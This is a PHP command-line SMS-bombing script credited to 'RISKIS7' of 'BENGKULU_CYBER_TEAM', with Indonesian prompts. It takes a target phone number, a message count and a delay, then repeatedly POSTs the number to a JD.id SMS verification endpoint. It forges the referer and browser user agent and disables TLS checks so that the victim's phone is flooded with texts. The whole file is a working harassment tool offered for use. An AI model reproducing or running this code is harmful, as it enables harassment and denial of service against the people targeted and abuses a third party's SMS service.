<?php
function jdidbom($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"http://sc.jd.id/phone/sendPhoneSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=".$no."&smsType=1");
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'http://sc.jd.id/phone/bindingPhone.html');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
               echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
    }
}
echo "
######################################################################################
\e[91m 
         BENGKULU_CYBER_TEAM
\e[32m
_______ _________________ _________ ______
| _ \ | |  / /\_\ | / / | |  / \_\     / /
| |_) | | / /   | |/ /  | | / /       / /
| _ < | | \ \>  | |\ \  | | \ \>     / /
|_| \_|_|__/_/__|_| \_\_|_|__/_/____/ /

    \e[91m green {C} Code By - RISKIS7 \e[32m
######################################################################################\n Riskis7 :\e[1;31m"
echo "\e[0;36m Masukan nomor tujuhan\n Riskis7 : ";
$nomor = trim(fgets(STDIN));
echo "\e[1;31m Riskis7 : Jumlah Bom Pesan? \n\e[0;36m Riskis7 : ";
$jumlah = trim(fgets(STDIN));
echo "\e[1;31m Riskis7 : Masukan Angka --> 0 \n\e[0;36m Riskis7 : ";
$jeda = trim(fgets(STDIN));
$execute = jdidbom($nomor, $jumlah, $jeda);
print $execute;
?>
